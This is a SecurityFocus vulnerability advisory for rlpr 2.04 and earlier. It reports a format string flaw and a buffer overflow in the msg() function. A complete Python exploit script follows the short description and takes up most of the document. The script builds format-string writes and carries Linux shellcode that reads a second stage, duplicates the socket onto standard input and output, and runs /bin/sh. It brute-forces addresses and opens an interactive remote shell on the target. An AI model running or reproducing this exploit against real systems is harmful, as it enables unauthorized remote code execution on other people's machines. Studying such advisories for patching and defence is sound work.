source: http://www.securityfocus.com/bid/10578/info

It is reported that rlpr is prone to multiple vulnerabilities. These vulnerabilities can allow a remote attacker to execute arbitrary code in order to gain unauthorized access.

The application is affected by a format string vulnerability. This vulnerability presents itself due to insufficient sanitization of user-supplied data through the 'msg()' function.

The 'msg()' function is also affected by a buffer overflow vulnerability. This issue occurs due to insufficient boundary checking and may also be exploited to gain unauthorized access to a vulnerable computer. 

rlpr versions 2.04 and prior are affected by these issues.

#!/usr/bin/python
import os, sys, socket, struct, time, telnetlib

class rlprd:
	fd = None
	pad = 2 

	#00000000  31DB              xor ebx,ebx
	#00000002  F7E3              mul ebx
	#00000004  B003              mov al,0x3
	#00000006  80C304            add bl,0x4
	#00000009  89E1              mov ecx,esp
	#0000000B  4A                dec edx
	#0000000C  CC                int3
	#0000000D  CD80              int 0x80
	#0000000F  FFE1              jmp ecx
	
	# read(4, esp, -1); jmp ecx
	lnx_readsc = "\x31\xdb\xf7\xe3\xb0\x03\x80\xc3\x04\x89\xe1\x4a\xcd\x80\xff\xe1"
	lnx_stage_one = "\x90" * (23 - len(lnx_readsc)) + lnx_readsc
	# dup2 shellcode(4->0,1,2)
	lnx_stage_two  = "\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb2\x3f\x88\xd0\xb3\x04" 
	lnx_stage_two += "\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0\x41\xcd\x80"
	# execute /bin/sh	
	lnx_stage_two += "\x90" * 100
	lnx_stage_two += "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68"
	lnx_stage_two += "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
	lnx_stage_two += "\xe1\x8d\x42\x0b\xcd\x80"

	targets = [ [ 0 ], [ "Compiled test platform", 0x0804c418, 0xbffff9e8 ] ] 
		
	bruteforce = 0

	def __init__(self, host, os, target, port=7290):
		self.host = host
		self.port = port

		set = 0
		if(os == "linux"):
			set = 1
			self.stage_one = self.lnx_stage_one
			self.stage_two = self.lnx_stage_two

		if(set == 0):
			print "Unknown OS"
			os._exit()

		self.os = os
		
		if(target == 0):
			self.bruteforce = 1
		else:	
			self.args = self.targets[target]

	def wl16(self, write_byte):
		write_byte += 0x10000
		self.already_written %= 0x10000
		padding = (write_byte - self.already_written) % 0x10000
		if(padding < 10):
			padding += 0x10000

		self.already_written += padding

		return padding

	def connect(self):
		#if self.fd is not None:
		#	self.fd.close()
		#	self.fd = None

		self.fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
		self.fd.connect((self.host, self.port))
	
	def exploit(self, where, what):
		if(not self.fd or self.fd is None): self.connect()
		self.already_written = len('gethostbyname(')

		#print "# of nops: %d\n" % (23 - len(self.readsc))

		exploit = "x" * self.pad
		self.already_written += self.pad

		exploit += struct.pack("<l", where)
		exploit += struct.pack("<l", where + 2)
		self.already_written += 8		

		l = self.wl16(what & 0xffff)
		fill = "%1$" + str(l) + "u"
		exploit += fill

		exploit += "%7$hn"
		
		l = self.wl16(what >> 16)
		fill = "%1$" + str(l) + "u"
		exploit += fill

		exploit += "%8$hn"

		#print "[*] Format string: (%s) Len: %d" % (exploit, len(exploit))
		#print "[*] Stage 1 length: %d" % len(self.stage_one)

		#time.sleep(5)
		try:
			self.fd.send(exploit + self.stage_one + "\n")
			self.fd.send(self.stage_two)
			time.sleep(1)
			self.fd.send("echo spawned; uname -a; id -a;\n")
			print "Recieved: " + self.fd.recv(1024)
		except:
			self.fd.close()
			self.fd = None 
			print "\tFailed @ 0x%08x" % what
			return 0

		remote = telnetlib.Telnet()
		remote.sock = self.fd
		print "[*] You should now have a shell"
		remote.interact()
		os.exit(0)

	def force(self, where, high, lo):
		for i in range(high, lo, -8):
			r.exploit(where, i)

	def run(self):
		if(self.bruteforce):
			print "Bruteforcing.."
			#print "not implemented yet"
			#os._exit(1)
			for i in range(0x0804c000, 0x0804d000, 0x100 / 6):
				print "Trying: 0x%08x" % i
				self.force(i, 0xbffffa00, 0xbffff9c0)

		#self.exploit(self.args[1], self.args[2])

if __name__ == '__main__':
	if(len(sys.argv) != 4):
		print "%s host [linux] targetid"
		print "- 0 to brute force"
		print "- 1 custom compile"
		os._exit(0)

	print "%s-%s-%s" % (sys.argv[1], sys.argv[2], sys.argv[3])
	r = rlprd(sys.argv[1], sys.argv[2], int(sys.argv[3]))
	#r.exploit(0x0804c418, 0xbffff9e8)
	#r.force(0x0804c418, 0xbffffa00, 0xbffff800)
	r.run()

